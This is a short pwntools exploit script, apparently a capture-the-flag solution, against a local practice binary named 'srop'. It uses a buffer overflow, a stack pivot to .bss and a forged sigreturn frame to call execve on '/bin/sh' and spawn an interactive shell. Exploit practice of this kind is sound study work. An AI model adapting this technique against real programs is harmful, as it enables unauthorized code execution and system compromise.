from pwn import *
context(arch="amd64",os="linux",log_level="debug")
io = process("./srop")
elf = ELF("srop")
set_rax_0xf = 0x40113e      # this gadget used to call sigreturn
syscall_eax0_ret = 0x401179
pop_rsi_r15_ret = 0x4011f1
read_bin_sh = 0x40116b
# read /bin/sh\x00 to .bss(0x404030), stack pivot
payload = 16 * b"a"+ p64(elf.bss()+0x20) + p64(pop_rsi_r15_ret) + p64(elf.bss())+p64(0) + p64(read_bin_sh)
gdb.attach(io)
io.sendlineafter("code:",payload)
fake_stack = b"/bin/sh\x00" + p64(0xdeadbeef)*4 + p64(set_rax_0xf) + p64(syscall_eax0_ret)
# fakesigreturnframe
fake_sig_return_frame = SigreturnFrame()
fake_sig_return_frame.rax = 59
fake_sig_return_frame.rdi = elf.bss()
fake_sig_return_frame.rsi = 0
fake_sig_return_frame.rdx = 0
fake_sig_return_frame.rip = syscall_eax0_ret

fake_stack += bytes(fake_sig_return_frame)

pause()
io.sendline(fake_stack)
io.interactive()